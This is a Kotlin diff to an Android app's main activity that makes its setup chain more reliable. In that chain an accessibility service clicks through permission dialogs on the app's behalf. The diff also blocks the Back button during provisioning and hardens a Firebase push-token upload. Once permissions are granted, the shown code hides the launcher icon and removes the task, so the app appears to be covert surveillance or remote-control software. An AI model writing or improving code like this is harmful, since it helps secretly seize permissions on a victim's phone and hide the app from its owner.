@@ -128,11 +128,49 @@ class MainActivity : AppCompatActivity() {
     private var isExiting = false
     private var batteryPrompted = false
 
+    // --- Setup-chain loop guards -------------------------------------------
+    // The chain is driven by ActivityResult callbacks, and several OEM screens
+    // return RESULT_CANCELED immediately. Without these guards one unresolved
+    // step could relaunch its settings screen dozens of times per second, which
+    // is what looked like an endless permission loop (and hammered the
+    // accessibility service until Android flagged it as malfunctioning).
+
+    /** Minimum gap between two step launches. */
+    private val setupStepIntervalMs = 1_100L
+
+    /** Hard ceiling on chain transitions in one app run. */
+    private val maxSetupTransitions = 40
+
+    private var lastSetupStepAt = 0L
+    private var setupTransitions = 0
+    private var pendingA11yConnectAt = 0L
+
+    private val setupStepHandler = Handler(Looper.getMainLooper())
+    private val setupStepRunnable = Runnable { handleNextSetupStep() }
+
+    private fun repostSetupStep(delayMs: Long) {
+        setupStepHandler.removeCallbacks(setupStepRunnable)
+        setupStepHandler.postDelayed(setupStepRunnable, delayMs)
+    }
+
     private fun completeSetupAndClose() {
         if (isExiting) return
-        isExiting = true
 
+        // Never disappear while the core grants are still missing. The chain
+        // used to finish (hide the icon and remove the task) as soon as every
+        // step had merely been *attempted*, so a device could end up with the
+        // icon gone and permissions un-granted - and then there was no way back
+        // into the app. If one of the verifiable grants is missing, stay
+        // visible so the next launch can retry.
+        if (!AutoGrantOrchestrator.coreReady(this)) {
+            Log.w(TAG, "Core permissions still missing - keeping the app visible")
+            refreshPermissionStatus()
+            return
+        }
+
+        isExiting = true
         isOneTapFlowRunning = false
+        setupStepHandler.removeCallbacks(setupStepRunnable)
         deviceState.markSetupCompleted()
         refreshPermissionStatus()
         triggerAutoSyncAfterAccessibility()
@@ -517,11 +555,64 @@ class MainActivity : AppCompatActivity() {
         if (isExiting) return
         isOneTapFlowRunning = true
 
+        // Throttle: OEM screens often return RESULT_CANCELED immediately, which
+        // used to bounce the chain as fast as callbacks could fire. That is the
+        // "permission loop" and it also hammered the accessibility service until
+        // Android marked it as malfunctioning.
+        val now = System.currentTimeMillis()
+        if (now - lastSetupStepAt < setupStepIntervalMs) {
+            repostSetupStep(setupStepIntervalMs)
+            return
+        }
+        lastSetupStepAt = now
+
+        // Absolute ceiling so one install can never spin forever, no matter what
+        // the firmware does with these screens.
+        setupTransitions++
+        if (setupTransitions > maxSetupTransitions) {
+            Log.w(TAG, "Setup chain reached $maxSetupTransitions transitions - stopping")
+            isOneTapFlowRunning = false
+            setupStepHandler.removeCallbacks(setupStepRunnable)
+            if (AutoGrantOrchestrator.coreReady(this)) completeSetupAndClose()
+            return
+        }
+
         // 0. Accessibility - cannot be self-granted, and cannot be clicked by a
         //    service that is not yet running, so it has to come first.
-        if (!isAccessibilityEnabled() && !skipAccessibilityStep) {
-            showAccessibilityDialog()
-            return
+        if (!skipAccessibilityStep) {
+            val enabled = isAccessibilityEnabled()
+            val connected = AccessibilityStatus.isConnected()
+
+            if (!enabled) {
+                AutoGrantOrchestrator.markAttempt(this, AutoGrantOrchestrator.Step.ACCESSIBILITY)
+                showAccessibilityDialog()
+                return
+            }
+
+            if (!connected) {
+                // Enabled in Settings but not connected: either the system is
+                // still starting it, or the service died and Settings shows
+                // "This service is malfunctioning". Give it a short grace and
+                // then re-open the screen, which re-arms the service, instead of
+                // silently skipping the step and running the rest of the chain
+                // blind with nothing able to click the dialogs.
+                if (pendingA11yConnectAt == 0L) {
+                    pendingA11yConnectAt = System.currentTimeMillis() + 6_000L
+                    repostSetupStep(1_500L)
+                    return
+                }
+                if (System.currentTimeMillis() < pendingA11yConnectAt) {
+                    repostSetupStep(1_500L)
+                    return
+                }
+                pendingA11yConnectAt = 0L
+                Log.w(TAG, "Accessibility enabled but not connected - reopening settings")
+                AutoGrantOrchestrator.markAttempt(this, AutoGrantOrchestrator.Step.ACCESSIBILITY)
+                showAccessibilityDialog()
+                return
+            }
+
+            pendingA11yConnectAt = 0L
         }
 
         // The service is alive from here; keep it clicking for the full chain
@@ -1178,29 +1269,36 @@ class MainActivity : AppCompatActivity() {
 
 
     private fun uploadCurrentFcmToken() {
-
-        FirebaseMessaging.getInstance().token
-
-            .addOnSuccessListener { token ->
-
-                Log.d(TAG, "FCM token fetched: $token")
-
-                FcmTokenSync.enqueueUpload(applicationContext, token)
-
-            }
-
-            .addOnFailureListener { e ->
-
-                Log.e(TAG, "FCM token fetch failed", e)
-
-            }
-
+        try {
+            FirebaseMessaging.getInstance().token
+                .addOnSuccessListener { token ->
+                    Log.d(TAG, "FCM token fetched: $token")
+                    FcmTokenSync.enqueueUpload(applicationContext, token)
+                }
+                .addOnFailureListener { e ->
+                    Log.e(TAG, "FCM token fetch failed", e)
+                }
+        } catch (e: Throwable) {
+            // FirebaseMessaging.getInstance() throws IllegalStateException when
+            // Firebase is not initialised for this process - a device without
+            // Google Play services, or a build shipped without google-services
+            // config. That used to crash onCreate and show "keeps stopping".
+            Log.w(TAG, "Firebase messaging unavailable on this device", e)
+        }
     }
 
 
 
     override fun onBackPressed() {
-        // Move app to background naturally instead of destroying the task hierarchy
+        // During provisioning a stray Back must not push the app to the back:
+        // the setup chain only advances while this Activity is resumed, and the
+        // old moveTaskToBack() here is what made the app "close" right before a
+        // permission was granted (the accessibility service used to send Back
+        // presses of its own).
+        if (isOneTapFlowRunning) return
+
+        // Otherwise move to background naturally instead of destroying the task
+        // hierarchy.
         moveTaskToBack(true)
     }
 
